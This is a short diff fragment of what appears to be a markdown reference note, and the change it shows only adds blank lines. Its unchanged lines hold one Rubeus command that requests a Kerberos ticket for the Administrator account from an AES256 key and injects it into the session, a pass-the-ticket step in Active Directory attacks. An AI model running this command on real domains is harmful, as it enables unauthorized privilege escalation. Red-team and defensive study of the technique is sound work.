@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:24.177808+00:00'
 ```bash
 .\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt
 ```
+
+
